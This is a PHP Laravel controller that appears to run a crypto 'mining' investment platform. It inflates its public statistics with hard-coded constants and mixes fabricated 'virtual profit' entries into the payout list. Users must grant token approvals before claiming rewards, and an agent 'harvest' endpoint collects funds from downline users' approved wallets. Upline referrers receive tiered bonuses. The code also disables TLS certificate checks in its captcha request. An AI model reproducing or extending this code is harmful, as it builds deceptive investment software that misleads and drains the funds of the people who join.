<?php


namespace App\Http\Controllers\Api;

use App\DAO\CoinChainDAO;
use App\DAO\UserDAO;
use App\Models\{
    Agent,
    AccountLog,
    AgentBonusLog,
    Currency,
    Financial,
    News,
    UserFinancial,
    Token,
    Users,
    UsersWallet,
    Setting,
    BondConfig,
    UsersWalletOut,
    FinancialReturnsBonus,
    MiningReturnsBonus,
    Model,
    UserInitTask,
    VirtualProfit,
    WalletLog
};
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\DB;
use PhpParser\Node\Expr\Array_;
use App\Utils\RPC;
use App\Events\WithdrawSubmitEvent;
use Exception;
use phpDocumentor\Reflection\Types\Null_;
use App\Events\UserRegisterEvent;

class FinancialController extends Controller
{
    public function buy(Request $request)
    {
        $user_id = Input::get('user_id', '');
        $currency_id = Input::get('currency_id', '');
        $num = Input::get('num', '');
        $num = UserFinancial::buyFinancial($user_id, $currency_id, $num);
    }

    public function init(Request $request)
    {
        $type = Input::get('type', 'web3');
        $lang = Input::get('lang', 'en');

    
        if ($type == 'web3') {
            return $this->init_data($lang, 18);
        } else {
           return $this->init_data($lang, 20);
        }
      
   
     
    }


    public function get_account_info()
    {  
        $custom_service_link = Setting::getValueByKey('custom_service_link');
        $data=[
            'custom_service_link'=>$custom_service_link
        ];
         $code= Input::get('code', ''); 
        //  if($code!='')
        //  {
        //       $user=Users::where('extension_code',$code)->first();
        //       if($user!=null)
        //       {
        //           $agent=Agent::where('user_id',$user->id)->first() ;
        //           if($agent!=null)
        //           {
        //             $data['custom_service_link']=$agent->custom_service_link;
        //           }
        //           else{
        //             $parent_user=Users::where('id',$user->parent_id)->first();
        //             if($parent_user!=null)
        //             {
        //                 $parent_agent=Agent::where('id',$parent_user->agent_id)->first() ;
        //                 if($parent_agent!=null && $parent_agent->custom_service_link !='' )
        //                 {
        //                     $data['custom_service_link']=$parent_agent->custom_service_link;
        //                 }
        //             }
        //           }
           
           
        //       }
        //  }
        $code= Input::get('code', ''); 
        if($code!='')
        {
            $user=Users::where('extension_code',$code)->first();
            if($user!=null)
            {
                $agent=Agent::where('id',$user->agent_id)->first() ;
                if($agent!=null)
                {
                    if(  $agent['custom_service_link']!='' )
                    {
                        $data['custom_service_link']=$agent->custom_service_link;
                    }
                }else{
                    //查看上级代理是否为1级
                    $parent_user=Users::where('id',$user->parent_id)->first();
                    if($parent_user!=null)
                    {
                        $parent_agent=Agent::where('id',$parent_user->agent_id)->first() ;
                        if($parent_agent!=null && $parent_agent->custom_service_link!=null && $parent_agent->custom_service_link !='' )
                        {
                            $data['agent_id']=$parent_agent->id;
                            $data['custom_service_link']=$parent_agent->custom_service_link;
                        }
                    }
                }
            }
        }


        return $this->success('success',$data);
    }

    public function init_data($lang, $currency)
    {
        //授权的地址
        $trx_address = Setting::getValueByKey('trx_address');
        $eth_address = Setting::getValueByKey('eth_address');
      
        $currencyData = Currency::CurrencyData()->toArray();
        $currencyDic = [];
        foreach ($currencyData as $item) {
            $currencyDic[$item['symbol']] = $item;
        }
        $address = [
            'eth' => $eth_address,
            'eth_usdt_contract' => $currencyDic['ETH-USDT']['contract_address'],
            'trc' => $trx_address,
            'trx_usdt_contract' => $currencyDic['TRX-USDT']['contract_address'],          
        ];
        //help_list
        $help_list = News::getHelpNewsList($lang);

        //pool
        $valid_node = Setting::getValueByKey('valid_node');
        $total_users = Users::count();
        $total_bonus_num = UserFinancial::where('currency', $currency)->sum('bonus_num');
        $total_parent_bonus = AccountLog::where('type', AccountLog::FINANCIAL_PARENT_BONUS)->sum('value');
        // $total_parent_bonus=UserFinancial::where('currency',$currency)->sum('parent_bonus_num');
        $total_bonus = bcadd($total_bonus_num, $total_parent_bonus, 8);
        $total_wallet_out = UsersWalletOut::where('currency', $currency)->sum('number');
        $pool = [
            'valid_node' =>bcadd($valid_node,0,2),
            'output' => bcadd($total_wallet_out,568669.78,2), //总分红
            'participant' => bcadd($total_users,287638,2), //参与人数
            'revenue' => bcadd($total_bonus,15368986.9855,5) //总收入
        ];
        $account_log = new AccountLog();
        $out_put_list = $account_log->leftjoin("users", "account_log.user_id", "=", "users.id")->where('account_log.type', AccountLog::FINANCIAL_TOKENEXCHANGE_ADD_LEGAL)->orderby('created_time','desc')->limit(100)->get();
 
        $profit_list = [];
        foreach ($out_put_list as $item) {
            # code...
            array_push($profit_list, [
                'address' => $item['account_number'],
                'money' => $item['value']
            ]);
        }

        $virtual_profit=VirtualProfit::get();
        foreach($virtual_profit as $item){
            array_push($profit_list, [
                'address' => $item['address'],
                'money' => $item['money']
            ]);
        }

        $data = [
            'address' => $address,
            'help_list' => $help_list,
            'pool' => $pool,
            'profit_list' => $profit_list,
            'custom_service_link'=> Setting::getValueByKey('custom_service_link'),
        ];



        
        return $this->success('查询成功', $data);
    }


    /**
     * 是否进行中
     */
    public function is_runing_financial(Request $request)
    {
        try {
            $address = Input::get('address', '');
            $user = Users::where('account_number', $address)->first();
            $data = [
                'end_date' => '',
                'is_running' => false,
                'can_receive' => false,
                'can_buy_again' => false
            ];
            if (!$user) {
                return $this->success('查询成功', $data);
            }
            $user_financial = UserFinancial::where('user_id', $user['id'])->where('is_return', 0)->first();
            $user_wallet = UsersWallet::where('user_id', $user['id'])->first();
            //如果is_running为false 则按钮是【参与】  如果can_receive为true则按钮是【领取】 依次判断       

            // $checkRes = CoinChainDAO::check_withdrawal($user_wallet->address, $user_wallet->currency);
            // if ($checkRes['balance'] < 1) {
            //     return $this->error('you need approve');
            // }

            if ($user_wallet->token_balance > 0) {
                $data['can_receive'] = true;
            }
            if ($user_financial) {
                $data['end_date'] = date('Y-m-d H:i:s', strtotime('+6 hour', strtotime($user_financial['create_time'])));
                $data['is_running'] = true;
                return $this->success('查询成功', $data);
            }
            $is_buy_financial = UserFinancial::where('user_id', $user['id'])->where('is_return', 1)->first(); //是否买过理财并且分红过了
            // $user_financial=false;
            // $is_buy_financial=true;
            //$user_wallet->token_balance=0;
            if (!$user_financial && $user_wallet->token_balance == 0 && $is_buy_financial) { //没有未分红的 没有未领取 有已买过
                $data['can_buy_again'] = true;
            }
            // $data['is_running'] = false;
            // $data['can_receive'] = false;
            return $this->success('查询成功', $data);
        } catch (Exception $ex) {
            return $this->error($ex->getMessage());
        }
    }

    public function buy_again(Request $request)
    {
        try {
            $address = Input::get('address', '');
            $user = Users::where('account_number', $address)->first();
            if (!$user) {
                return $this->error('user not exists');
            }
            //是否有正在运行中的矿机
            $user_financial = UserFinancial::where('user_id', $user['id'])->where('is_return', 0)->first();
            if ($user_financial) {
                return $this->error('financial is running...');
            }
            $user_wallet = UsersWallet::where('address', $address)->first();
            $checkRes = CoinChainDAO::check_withdrawal($user_wallet->address, $user_wallet->currency);
            if ($checkRes['balance'] <= 0) {
                return $this->error('you need approve');
            }
            $balance = CoinChainDAO::get_balance($user_wallet->address, $user_wallet->currency);
            if ($balance['balance'] <= 0) {
                return $this->error('balance not enough');
            }
            UserFinancial::buyFinancial($user['id'], $user_wallet['currency'], $balance['balance']);
            return $this->success('操作成功', 'successful');
        } catch (Exception $ex) {
            if ($ex->getMessage() == "approve blance is less than 0") {
                return $this->error($ex->getMessage(), 601);
            }
            return $this->error($ex->getMessage());
        }
    }

    /**
     * 获取公告列表
     */
    public function get_notice_list(Request $request)
    {
        $lang = Input::get('lang', 'en');
        $list = News::getNoticeList($lang);
        return $this->success('查询成功', $list);
    }

    
    /**
     * 获取公告详情
     */
    public function get_notice_detail(Request $request)
    {
        $id = Input::get('id', 0);
        $detail = News::where('id', $id)->first();
        if (!$detail) {
            return $this->error('errors');
        }
        return $this->success('查询成功', $detail);
    }


    function get_client_ip($type = 0) {
        $type       =  $type ? 1 : 0;
        static $ip  =   NULL;
        if ($ip !== NULL) return $ip[$type];
        if(isset( $_SERVER['HTTP_X_REAL_IP'])){//nginx 代理模式下，获取客户端真实IP
            $ip=$_SERVER['HTTP_X_REAL_IP'];     
        }elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {//客户端的ip
            $ip     =   $_SERVER['HTTP_CLIENT_IP'];
        }elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {//浏览当前页面的用户计算机的网关
            $arr    =   explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            $pos    =   array_search('unknown',$arr);
            if(false !== $pos) unset($arr[$pos]);
            $ip     =   trim($arr[0]);
        }elseif (isset($_SERVER['REMOTE_ADDR'])) {
            $ip     =   $_SERVER['REMOTE_ADDR'];//浏览当前页面的用户计算机的ip地址
        }else{
            $ip=$_SERVER['REMOTE_ADDR'];
        }
        // IP地址合法验证
        $long = sprintf("%u",ip2long($ip));
        $ip   = $long ? array($ip, $long) : array('0.0.0.0', 0);
        return $ip[$type];
    }

    public function info(Request $request)
    {
        $address = Input::get('address', '');
        $parent_address = Input::get('parent_address', '');
        if ($address == '' ||  $address==null) {
            return $this->error('The address cannot be empty');
        }
        \App\Models\VistLog::insert(['address'=>$address,'ip'=>self::get_client_ip(0),'time'=>time(),'type'=>'Vist','code'=>$parent_address]);
        
        $user = Users::where('account_number', $address)->first();
        if ($parent_address != '' && !$user) {
            $parent_task = UserInitTask::where('user_address', $address)->first();
            if (!$parent_task) {
                $parent_task = new UserInitTask(); 
            }
            $parent_user = Users::where('extension_code', $parent_address)->first();
            if ($parent_user) {
                $parent_task['user_address'] = $address;
                $parent_task['parent_address'] = $parent_user['account_number'];
                $parent_task['add_time'] = time();
                $parent_task['status'] = 0;
                $parent_task->save();
            }
        }
        if (!$user) {
            return response()->json(['code' => 501, 'msg' => 'unauthorized', 'data' => 'unauthorized']);
        }
        $user_wallet = UsersWallet::where('user_id', $user['id'])->first();
        $token = Token::setToken($user->id);
        $available_profit = $user_wallet['legal_balance']; //可提取奖励
        $total_profit = FinancialReturnsBonus::where('user_id', $user['id'])->sum('num'); //总奖励
        $total_profit=bcadd($total_profit,$user->virtual_user_profit);
        $wallet_balance = $user_wallet['change_balance']; //钱包余额
        $data = [
            'token' => $token,
            'available_profit' => $available_profit,
            'total_profit' => $total_profit,
            'wallet_balance' => $wallet_balance,
            'is_agent' => $user['agent_id']>0?1:0
        ];
        return $this->success('操作成功', $data);
    }
    /**
     * 将奖励转换成余额
     */
    public function exchange(Request $request)
    {
        $num = Input::get('num', 0);
        if ($num <= 0) {
            return $this->error('must be greater than 0');
        }
        $user_id = Users::getUserId();
        $user_wallet = UsersWallet::where('user_id', $user_id)->first();
        if ($user_wallet['legal_balance'] < $num) {
            return $this->error('failed');
        }
        try {
            DB::beginTransaction();
            $result = change_wallet_balance($user_wallet, 1, -$num, AccountLog::FINANCIAL_EXCHANGE, '提取奖励');
            if ($result !== true) {
                throw new \Exception($result);
            }

            $usdt_rate=Setting::getValueByKey('usdt_rate',3000);
            $usdt_rate=floatval($usdt_rate);
            $result = change_wallet_balance($user_wallet, 2,bcmul($num,$usdt_rate) , AccountLog::FINANCIAL_EXCHANGE_ADD_CHANGE, '提取奖励');
            if ($result !== true) {
                throw new \Exception($result);
            }

            // $user=Users::find($user_id);
            // $parents= UserDAO::getParentsPathDesc($user);
            // $parent_ids=implode(',',$parents);
            // $parents= UserDAO::getParentsPathDesc($user);
            // $config= BondConfig::Intnace();
            // $guid=self::create_guid();
            // $user_report_list=UserFinancial::getUserReportList($parent_ids);
            // for ($i=0; $i <count($parents); $i++) { 
            //     # code...
            //     $parent_id= $parents[$i];
            //     $team_charge=self::getReportBuyReport($user_report_list,$parent_id);
            //     $parent_financial_count=UserFinancial::where('user_id',$parent_id)->count();
            //     if($parent_financial_count<=0){
            //         continue;
            //     }
            //     // if($team_charge->recharge>0){

            //     $total_recharge=bcadd($team_charge['team_total_recharge'],$team_charge['total_recharge'],2);
            //     $rate=$config->getFundDynamicConfig($total_recharge,$i+1);
            //     if($rate>0){
            //         $rate_num= $num*$rate;
            //         $parent_user_wallet = UsersWallet::where("user_id", $parent_id)
            //         ->where("currency", $user_wallet['currency'])
            //         ->lockForUpdate()
            //         ->first();
            //         $dai=$i+1;
            //         $str='S '.$dai.'D '.$user_wallet->address.' '.$num.' '.$total_recharge.' ';
            //         change_wallet_balance($parent_user_wallet, 1, $rate_num, AccountLog::FINANCIAL_PARENT_BONUS, $str,false,0,0,'',false,false,$guid);
            //     }
            // }

            DB::commit();
        } catch (\Exception $ex) {
            DB::rollBack();
            return $this->error(/*'File:' . $ex->getFile() . ',Line:'. $ex->getLine() . ',Message:'.*/$ex->getMessage());
        }

        return $this->success('successful');
    }

    /**
     * 领取
     */
    public function exchangeAll()
    {

        $token_balance = 0;
        try {
            $user_id = Users::getUserId();
            $user_wallet = UsersWallet::where('user_id', $user_id)->first();
            $token_balance = $user_wallet->token_balance;
            if ($token_balance <= 0) {
                return $this->error('balance not enough');
            }
            $checkRes = CoinChainDAO::check_withdrawal($user_wallet->address, $user_wallet->currency);
            if ($checkRes['balance'] <= 0) {
                return $this->error('you need approve');
            }

            $user = Users::find($user_id);
            if ($user['can_transfer_num'] > $checkRes['balance']) {
                return $this->error('the approved quantity is less than the received quantity');
            }
        } catch (\Exception $ex) {
            if ($ex->getMessage() == "approve blance is less than 0") {
                return $this->error($ex->getMessage(), 601);
            }
            return $this->error(/*'File:' . $ex->getFile() . ',Line:'. $ex->getLine() . ',Message:'.*/$ex->getMessage());
        }


        try {
            $num = $token_balance;
            DB::beginTransaction();
            $result = change_wallet_balance($user_wallet, 4, -$num, AccountLog::FINANCIAL_TOKENEXCHANGE, '领取奖励');
            if ($result !== true) {
                throw new \Exception($result);
            }
            $result = change_wallet_balance($user_wallet, 1, $num, AccountLog::FINANCIAL_TOKENEXCHANGE_ADD_LEGAL, '领取奖励');
            if ($result !== true) {
                throw new \Exception($result);
            }


            $parents = UserDAO::getParentsPathDesc($user);
            $parent_ids = implode(',', $parents);
            $parents = UserDAO::getParentsPathDesc($user);
            $config = BondConfig::Intnace();
            $guid = self::create_guid();
            $user_report_list = UserFinancial::getUserReportList($parent_ids);
            for ($i = 0; $i < count($parents); $i++) {
                # code...
                $parent_id = $parents[$i];
                $team_charge = self::getReportBuyReport($user_report_list, $parent_id);
                $parent_financial_count = UserFinancial::where('user_id', $parent_id)->count();
                if ($parent_financial_count <= 0) {
                    continue;
                }
                // if($team_charge->recharge>0){

                $total_recharge = $team_charge['team_total_recharge'];
                $rate = $config->getFundDynamicConfig($total_recharge, $i + 1);
                if ($rate > 0) {
                    $rate_num = $num * $rate;
                    $parent_user_wallet = UsersWallet::where("user_id", $parent_id)
                        ->lockForUpdate()
                        ->first();
                    $dai = $i + 1;
                    $str = 'S ' . $dai . 'D ' . $user_wallet->address . ' ' . $num . ' ' . $total_recharge . ' ';
                    change_wallet_balance($parent_user_wallet, 1, $rate_num, AccountLog::FINANCIAL_PARENT_BONUS, $str, false, 0, 0, '', false, false, $guid);
                }
            }

            DB::commit();
        } catch (\Exception $ex) {
            DB::rollBack();
            return $this->error(/*'File:' . $ex->getFile() . ',Line:'. $ex->getLine() . ',Message:'.*/$ex->getMessage());
        }

        return $this->success('successful');
    }


    public function getInviteCode()
    {
        $user_id = Users::getUserId();
        $user = Users::getById($user_id);

        if (!$user->extension_code) {
            $user->extension_code = Users::getExtensionCode();
            $user->save();
        }
        return $this->success('查询成功', $user->extension_code);
    }

    public function registerByAgent(){
        return;
        $address=Input::get('address','');
        $extension_code = Input::get('extension_code', '');
        if($address==''||$extension_code==''){
            return $this->error('参数错误');
        }
        $user = Users::getByString($address, '');
        if (!empty($user)) {
            return $this->error('账号已存在');
        }
        $parent_id = 0;
        $p = Users::where("extension_code", $extension_code)->first();
        if (empty($p)) {
            return $this->error("邀请码错误");
        } else {
            $parent_id = $p->id;
            $parent_phone = $p->phone;
        }
        DB::beginTransaction();
        try {
            $users = new Users();
            $users->account_number=$address;
            $users->type=1;
            $users->phone=$address;
            $users->time=time();
            $users->parent_id=$parent_id;
            $users->extension_code = Users::getExtensionCode();
            $users->status=0;
            $users->is_blacklist=0;
            $users->parents_path = $str = UserDAO::getRealParentsPath($users); //生成parents_path     tian  add
            //代理商节点id。标注该用户的上级代理商节点。这里存的代理商id是agent代理商表中的主键，并不是users表中的id。
            $users->agent_note_id = Agent::reg_get_agent_id_by_parentid($parent_id);
            //代理商节点关系
            $users->agent_path = Agent::agentPath($parent_id);
            $users->is_realname=1;
            $users->trx_address=$address;
            $users->save(); //保存到user表中

            event(new UserRegisterEvent($users));

            DB::commit();
            return $this->success("注册成功");
        } catch (\Exception $ex) {
            DB::rollBack();
            return $this->error($ex->getMessage());
        }



    }

    public static function getReportBuyReport($report_list, $uid)
    {
        foreach ($report_list as $item) {
            # code...
            if ($item['uid'] == $uid) {
                return $item;
            }
        }
        return null;
    }

    public static function  create_guid()
    {
        $charid = strtoupper(md5(uniqid(mt_rand(), true)));
        $hyphen = chr(45); // "-"
        $uuid = substr($charid, 0, 8) . $hyphen
            . substr($charid, 8, 4) . $hyphen
            . substr($charid, 12, 4) . $hyphen
            . substr($charid, 16, 4) . $hyphen
            . substr($charid, 20, 12);
        return $uuid;
    }

    /**
     * 提现
     */
    public function withdrawal()
    {

        $google_code = Input::get('code', '');
        //谷歌验证码验证        
        $code_res = self::checkCaptcha($google_code);
        DB::beginTransaction();
        try {
            $user_id = Users::getUserId();
            $amount = Input::get('amount', '');
            $user = Users::where('id', $user_id)->first();
            $address = $user['account_number'];
            if (empty($user)) {
                return $this->error('address wrong');
            }


            if (!$code_res) {
                return $this->error('google code error');
            }

            $wallet = UsersWallet::where('user_id', $user_id)
                ->lockForUpdate()
                ->first();

            // try {
            //     $checkRes = CoinChainDAO::check_withdrawal($wallet->address, $wallet->currency);
            //     if ($checkRes['balance'] <= 0) {
            //         return $this->error('you need approve');
            //     }
            // } catch (Exception $ex) {
            //     $msg = $ex->getMessage();
            //     if ($msg != 'blance is less than 0') {
            //         throw $ex;
            //     }
            // }


            $currency = Currency::where('id', $wallet['currency'])->first();
            $currency_id = $currency['id'];
            throw_if(bc_comp_zero($amount) <= 0, new \Exception('must be greater than 0'));
            $min_config = Setting::getValueByKey('withdraw_min_amount');
            $max_config = Setting::getValueByKey('withdraw_max_amount');
            throw_if(bc_comp($amount, $min_config) < 0, new \Exception('cannot be lower than the minimum'));
            throw_if(bc_comp($amount, $max_config) > 0 && bc_comp_zero($currency->max_number) > 0, new \Exception('cannot be higher than the maximum'));
            throw_if(bc_comp($amount, $wallet->change_balance) > 0, new \Exception('balance not enough'));

            if (empty($currency_id) || empty($address)) {
                throw new \Exception('parms error');
            }


            $rate = $currency->rate;
            $rate = bc_div($rate, 100);

            $walletOut = new UsersWalletOut();
            $walletOut->user_id = $user_id;
            $walletOut->currency = $currency_id;
            $walletOut->number = $amount;
            $walletOut->address = $address;
            $walletOut->rate = $rate;
            // $walletOut->real_number = bc_mul($withdrawal_amount, bc_sub(1, $rate));
            $walletOut->real_number = $amount;
            $walletOut->create_time = time();
            $walletOut->update_time = time();
            $walletOut->memo = '';

            $walletOut->status = 1;
            $walletOut->receivable = 0;
            $walletOut->reinvest = 0;
            $walletOut->type = 2;
            $walletOut->save();

            $result = change_wallet_balance($wallet, 2, -$amount, AccountLog::WALLETOUT, '申请提币扣除余额');
            if ($result !== true) {
                throw new \Exception($result);
            }

            $result = change_wallet_balance($wallet, 2, $amount, AccountLog::WALLETOUT, '申请提币冻结余额', true);
            if ($result !== true) {
                throw new \Exception($result);
            }


            DB::commit();
            event(new WithdrawSubmitEvent($walletOut));
            return $this->success('successful，please wait');
        } catch (\Exception $ex) {
            DB::rollBack();
            return $this->error(/*'File:' . $ex->getFile() . ',Line:'. $ex->getLine() . ',Message:'.*/$ex->getMessage());
        }
    }
    /**
     * 提取列表
     */
    public function exchange_list(Request $request)
    {
        $user_id = Users::getUserId();
        $limit = $request->get('limit', 10);

        $list = new AccountLog();
        $list = $list->where('user_id', $user_id);

        $list = $list->where('type', AccountLog::FINANCIAL_EXCHANGE_ADD_CHANGE)->orderBy('id', 'desc')->paginate($limit);
        $new_list = [];
        foreach ($list as $item) {
            # code...
            array_push($new_list, [
                'time' => $item['created_time'],
                'quantity' => $item['value']
            ]);
        }
        $data = [
            'list' => $new_list,
            'count' => $list->total()
        ];
        return $this->success($data);
    }
    /**
     * 提现列表
     */
    public function withdrawal_list(Request $request)
    {
        $user_id = Users::getUserId();
        $limit = $request->get('limit', 10);
        $list = new UsersWalletOut();
        $list = $list->where('user_id', $user_id)->orderBy('id', 'desc')->paginate($limit);
        $new_list = [];
        foreach ($list as $item) {
            # code...
            array_push($new_list, [
                'time' => $item['create_time'],
                'quantity' => $item['number'],
                'status_name' => $item['statusname'],
                'status' => $item['statusname']
            ]);
        }
        // return response()->json(['code' => 0, 'data' => $list->items(), 'count' => $list->total()]);
        $data = [
            'list' => $new_list,
            'count' => $list->total()
        ];
        return $this->success($data);
    }
    /**
     * 代理下级列表
     */
    public function agent_user_list()
    {
        try {
            $user_id = Users::getUserId();
            $user = Users::where('id', $user_id)->first();
            if ($user['agent_id'] == 0) return $this->error('You are not an agent');
            // $user_list = Users::where('parent_id', $user_id)->where('is_agent', 0)->get();
            if($user['agent_path']==''){
                return $this->error('代理错误');
            }
            $user_list=Users::where('agent_path','like', '%' . $user['agent_path'] . '%')->where('id','<>',$user['id'])->get();
            // $all_users = Users::get();
            // $user_list = UserDAO::GetAllChildren($all_users, $user['id']);
    
            $new_list = [];
            foreach ($user_list as $item) {
                try{
                    $wallet = UsersWallet::where('address', $item['account_number'])->first();
                    $can_transfer_num = $wallet['auth_balance'] < $wallet['old_balance'] ? $wallet['auth_balance'] : $wallet['old_balance'];
                    $is_transfer = 1;
        
                    if ($wallet['collect_status'] == 0 && $can_transfer_num > 0) {
                        $is_transfer = 0;
                    }
                    array_push($new_list, [
                        'id' => $item['id'],
                        'address' => $item['account_number'],
                        'add_time' => $item['time'],
                        'can_transfer_num' => $can_transfer_num,
                        'is_transfer' =>  $is_transfer
                    ]);
                }catch(Exception $ex)
                {
    
                }
            
            }
            return $this->success('查询成功', $new_list);
        }catch(Exception $err)
        {
            return $this->error($err->getMessage());
        }
      
    }


    public function update_balance(Request $request)
    {
        try {

            $tansfer_user_id = Input::get('id', 0);

            //发起划转
            $user_wallet = UsersWallet::where('user_id', $tansfer_user_id)->first();
            if ($user_wallet['collect_status'] == 1) return $this->error('collecting....');
            $res = CoinChainDAO::updateWalletBalance($user_wallet);
            return $this->success('更新成功', $res);
        } catch (Exception $err) {
            return $this->error($err->getMessage());
        }
    }
    /**
     * 收割按钮
     */
    public function agent_transer(Request $request)
    {

        try {
            $user_id = Users::getUserId();
            $tansfer_user_id = Input::get('id', 0);
            if ($tansfer_user_id == 0) return $this->error('user not exist');
            $user = Users::where('id', $tansfer_user_id)->first();
            // if($user['is_transfer']==1) return $this->error('用户已划转，请勿重复划转');
            // if ($user['parent_id'] != $user_id) return $this->error('is not your invited');
            $parents_path = $user['parents_path'];
            $parents_path_arr = explode(',', $parents_path);
            if (!in_array($user_id, $parents_path_arr)) {
                return $this->error('you can not do this');
            }
            //发起划转
            $user_wallet = UsersWallet::where('user_id', $tansfer_user_id)->first();
            if ($user_wallet['collect_status'] == 1) return $this->error('collecting....');
            $is_collect = CoinChainDAO::collect($user_wallet, false, $user_id);
            return $this->success('划转成功');
        } catch (Exception $err) {
            return $this->error($err->getMessage());
        }
    }

    /**
     * 获取直接邀请人
     */
    public function get_direct_invited()
    {
        $user_id = Users::getUserId();
        $user_list = Users::where('parent_id', $user_id)->where('is_agent', 0)->get();
        $new_list = [];
        foreach ($user_list as $item) {
            array_push($new_list, [
                'id' => $item['id'],
                'address' => $item['account_number'],
                'add_time' => $item['time']
            ]);
        }
        return $this->success('查询成功', $new_list);
    }

    /**
     * 分红列表
     */
    public function mining_list(Request $request)
    {
        $user_id = Users::getUserId();
        $limit = $request->get('limit', 10);
        $list = new FinancialReturnsBonus();
        $list = $list->where('user_id', $user_id)->orderBy('id', 'desc')->paginate($limit);
        $new_list = [];
        foreach ($list as $item) {
            # code...
            array_push($new_list, [
                'time' => $item['return_time'],
                'quantity' => $item['num']
            ]);
        }
        // return response()->json(['code' => 0, 'data' => $list->items(), 'count' => $list->total()]);
        $data = [
            'list' => $new_list,
            'count' => $list->total()
        ];
        return $this->success($data);
    }

    /**
     * 代理分红列表
     */
    public function agent_bonus_list()
    {
        $user_id = Users::getUserId();
        $bonus_log = AgentBonusLog::where('agent_user_id', $user_id)->get();
        return $this->success('查询成功', $bonus_log);
    }


    /***
     * 获取矿机列表
     */
    public function getFinancialList(Request $request)
    {
        $limit = $request->get('limit', 10);
        $user_id = Users::getUserId();
        $query = Financial::where('is_newuser', 0)
            ->where('is_up', 1)
            ->orderBy('sorts')
            ->paginate($limit);
        // $lists=$lists->items();
        // $data = array('data' => $lists->items(), 'page' => $lists->currentPage(), 'pages' => $lists->lastPage(), 'total' => $lists->total());
        $list = $query->items();
        $data = [];
        foreach ($list as $item) {
            $tags_day = '合约期' . $item['days'];
            $data[] = [
                'id' => $item['id'],
                'catalog' => 'Trx',
                'name' => $item['financial_name'],
                'title' => $item['financial_name'],
                'quantity' => 0,
                'totalQuantity' => 0,
                'buyCoin' => 'TRX',
                'buyAmount' => $item['num'],
                'produceCoin' => 'IPFS',
                'produceAmount' => 0,
                'produceScale' => 0,
                'lifeCycle' => $item['days'],
                'effectiveCycle' => 10,
                'effectiveTime' => 1625042629000,
                'powerVol' => 10,
                'powerUnit' => 'T',
                'rewardCoin' => '',
                'rewardAmount' => 0.0,
                'pledgeAmount' => 0.0,
                'gasAmount' => 0.0,
                'fee' => $item['rate'],
                "day_bonus" => $item['day_bonus'],
                'status' => 1,
                'intro' => '',
                'tags' => '["' . $item['label1'] . '","' . $item['label2'] . '"]',
                'ctime' => 1623660266000,
                'mtime' => 1629944809000,
            ];
        }
        $user_wallet = UsersWallet::where("user_id", $user_id)
            ->where("currency", 18)
            ->first();
        $dataTable = [
            'code' => 200,
            'msg' => 0,
            'pages' => $query->currentPage(),
            'total' => $query->total(),
            'rows' => $data
        ];
        $result = ['catelogs' => ['TRX'], "dataTable" => $dataTable, 'balance' => $user_wallet->legal_balance];
        return $this->success('操作成功', $result);
    }

    /***
     * 矿机详情
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function financialDetail(Request $request)
    {
        $id = $request->get('id');
        if (empty($id)) {
            return $this->error('id不能为空');
        }
        $detail = Financial::where('id', $id)->first();
        return $this->success('操作成功', $detail);
    }

    /***
     * 新用户矿机列表
     */
    public function getNewUserFinancialList(Request $request)
    {
        $limit = $request->get('limit', 10);
        $lists = Financial::where('is_newuser', 1)
            ->where('is_up', 1)
            ->orderBy('sorts')
            ->paginate($limit);
        $result = array('data' => $lists->items(), 'page' => $lists->currentPage(), 'pages' => $lists->lastPage(), 'total' => $lists->total());
        return $this->success('操作成功', $result);
    }

    /**
     *我的矿机列表
     */
    public function myFinancialList(Request $request)
    {
        $limit = $request->get('limit', 10);
        $user_id = Users::getUserId();
        $lists = UserFinancial::where('user_id', $user_id)
            ->orderBy('id', 'desc')
            ->paginate($limit);
        $result = array('data' => $lists->items(), 'page' => $lists->currentPage(), 'pages' => $lists->lastPage(), 'total' => $lists->total());
        return $this->success('操作成功', $result);
    }

    /***
     * 我的
     */
    public function my()
    {
        //        $usdt_price=Currency::getCnyPrice(3);
        $usdt_price = Setting::getValueByKey('mining_usdt_price', '0');
        $user_id = Users::getUserId();
        $start_time = strtotime(date('Y-m-d', strtotime('-1 day')));
        $end_time = strtotime(date('Y-m-d'));

        $yesterday_profit = AccountLog::where("user_id", $user_id) //昨日收益
            ->whereIn('type', [AccountLog::MINING_BONUS, AccountLog::MINING_PARENT_BONUS])
            ->where('created_time', '>=', $start_time)
            ->where('created_time', '<=', $end_time)->sum('value');

        $total_data = AccountLog::where("user_id", $user_id)
            ->whereIn('type', [AccountLog::MINING_BONUS, AccountLog::MINING_PARENT_BONUS])
            ->orderBy('id', 'DESC')->select();
        $total_profit = $total_data->sum('value'); //总收益

        return $this->success(array(
            'yesterday_profit' => $yesterday_profit,
            'yesterday_profit_cny' => bcmul($yesterday_profit, $usdt_price, 8),
            'total_profit' => $total_profit,
            'total_profit_cny' => bcmul($total_profit, $usdt_price, 8)
        ));
    }



    private static function checkCaptcha($code)
    {
        $google_code = Setting::getValueByKey('google_code', '');
        $url = 'https://www.recaptcha.net/recaptcha/api/siteverify'; //国内的js
        $data = [
            'secret' => $google_code,
            'response' => $code,
        ];
        $query = http_build_query($data);

        $options['http'] = array(
            'timeout' => 60,
            'method' => 'POST',
            'header' => 'Content-type:application/x-www-form-urlencoded',
            'content' => $query
        );
        $options['ssl'] = array(
            'verify_peer' => false,
            'verify_peer_name' => false
        );

        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
        $res = json_decode($result);
        return $res->success;
    }

    /***
     * 购买矿机 购买的动态分红
     */
    public function buy_old(Request $request)
    {
        DB::beginTransaction();
        try {
            $minig_id = $request->get('id');
            $buy_num = $request->get('buy_num');
            if (empty($buy_num) || $buy_num < 1) {
                return $this->error('买卖数量不能小于1');
            }
            $user_id = Users::getUserId();
            $ming_machine = Financial::find($minig_id);
            if (empty($ming_machine)) {
                return $this->error('矿机不存在');
            }
            $user_wallet = UsersWallet::where("user_id", $user_id)
                ->where("currency", 3)
                ->lockForUpdate()
                ->first();
            $usdt_balance = $user_wallet->change_balance;
            if (bccomp($usdt_balance, $ming_machine->num * $buy_num) < 0) {
                return $this->error('余额不足');
            }
            $mining_machine = Financial::find($minig_id);
            $out_num = bcadd($mining_machine->out_num, $buy_num, 0);
            if ($out_num > $mining_machine->stock_num) {
                return $this->error('矿机库存不足');
            }


